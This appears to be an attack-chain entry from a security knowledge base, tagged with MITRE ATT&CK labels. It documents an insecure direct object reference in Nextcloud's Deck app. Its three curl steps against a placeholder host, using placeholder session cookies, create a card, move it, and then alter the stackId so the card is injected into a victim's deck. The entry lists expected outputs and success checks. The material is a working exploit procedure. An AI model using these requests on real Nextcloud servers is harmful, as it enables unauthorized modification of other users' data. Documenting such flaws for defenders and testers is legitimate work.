---
tags:
  - nextcloud
  - deck
  - access-control
  - idor
  - unauthorized-modification
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Persistence]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Create-Card-in-Own-Deck]]'
  - '[[procedures/Move-Card-to-Target-Stack]]'
  - '[[procedures/Intercept-and-Modify-Stack-ID-for-Injection]]'
step_count: 3
techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:29:19.826Z'
description: >-
  Authenticated users exploit improper access control in Nextcloud Deck to
  inject tasks into other users' decks by modifying the stackId in API requests.
skill_level: intermediate
impact_level: medium
id: 52190f68-dce7-4d3c-a45b-f03a4ac94b3b
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Persistence]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
---
# Unauthorized Task Injection in Nextcloud Deck via Stack ID Manipulation

Multi-stage attack chain demonstrating exploitation of improper access control in Nextcloud's Deck app, allowing authenticated users to pollute other users' decks with unauthorized tasks.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | Medium |

## Attack Flow Visualization

```mermaid
graph LR
    A[Create Card in Own Deck] --> B[Prepare Move Request] --> C[Intercept and Inject to Target Deck]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[Burp Suite]] (for intercepting requests)

### Target Environment

- Nextcloud instance with Deck app enabled
- Authenticated access as a low-privilege user
- API endpoints accessible via web interface or direct HTTP

### Initial Access Requirements

- Valid Nextcloud user credentials
- Network access to the Nextcloud server
- No prior administrative access needed

## Detailed Attack Procedures

### Step 1: Create Card in Own Deck
procedure: [[procedures/Create-Card-in-Own-Deck]]

**Objective**: Create a test task (card) in the attacker's own deck to use for injection.

**Instructions**: Use the Deck app interface or API to create a new card in your own stack. This establishes a card ID that can be manipulated later.

Execute [[commands/post-create-deck-card]] to create the card:

```bash
curl -X POST 'https://nextcloud.example.com/apps/deck/cards' \
  -H 'Content-Type: application/json' \
  -H 'OCS-APIRequest: true' \
  -H 'Cookie: nc_username=attacker; nc_token=session_token' \
  -d '{"title":"SOME_TEST","stackId":1,"type":"plain"}'
```

**Expected Output**: JSON response with new card ID (e.g., {"id":13}).

**Success Indicators**:
- Card created successfully in own deck
- Card ID returned for next steps

### Step 2: Move Card to Own Stack
procedure: [[procedures/Move-Card-to-Target-Stack]]

**Objective**: Perform a legitimate move operation to capture the request structure for interception.

**Instructions**: Initiate a move of the created card to another stack in your own deck to generate the PUT request that will be modified.

Execute [[commands/put-move-deck-card-own]] to move the card:

```bash
curl -X PUT 'https://nextcloud.example.com/apps/deck/cards/13' \
  -H 'Content-Type: application/json' \
  -H 'OCS-APIRequest: true' \
  -H 'Cookie: nc_username=attacker; nc_token=session_token' \
  -d '{"title":"SOME_TEST","description":"","stackId":2,"type":"plain","lastModified":1588755341,"lastEditor":null,"createdAt":1588755341,"labels":null,"assignedUsers":null,"attachments":null,"attachmentCount":null,"owner":"attacker","order":999,"archived":false,"duedate":null,"deletedAt":0,"commentsUnread":0,"id":13,"overdue":0}'
```

**Expected Output**: 200 OK response confirming the move.

**Success Indicators**:
- Card moved within own deck
- Request structure captured for modification

### Step 3: Intercept and Modify Stack ID for Injection
procedure: [[procedures/Intercept-and-Modify-Stack-ID-for-Injection]]

**Objective**: Intercept the move request and alter the stackId to point to a target user's deck, injecting the task without authorization.

**Instructions**: Use a proxy like Burp Suite to intercept the PUT request from Step 2, change the stackId to the victim's stack (e.g., 6), and forward it.

Execute the modified [[commands/put-move-deck-card-target]]:

```bash
curl -X PUT 'https://nextcloud.example.com/apps/deck/cards/13' \
  -H 'Content-Type: application/json' \
  -H 'OCS-APIRequest: true' \
  -H 'Cookie: nc_username=attacker; nc_token=session_token' \
  -d '{"title":"SOME_TEST","description":"","stackId":6,"type":"plain","lastModified":1588755341,"lastEditor":null,"createdAt":1588755341,"labels":null,"assignedUsers":null,"attachments":null,"attachmentCount":null,"owner":"attacker","order":999,"archived":false,"duedate":null,"deletedAt":0,"commentsUnread":0,"id":13,"overdue":0}'
```

**Expected Output**: 200 OK response; verify by logging in as victim to see injected card.

**Success Indicators**:
- 200 OK without error
- Task appears in victim's deck

## Attack Chain Summary

### Key Achievements

1. Created a controllable task in own deck
2. Captured and modified API request to bypass access controls
3. Injected unauthorized task into victim's deck, polluting their workflow

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Valid Accounts]] Valid Accounts
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Persistence]] Persistence

---
*Last updated: 2023-10-01T00:00:00Z*
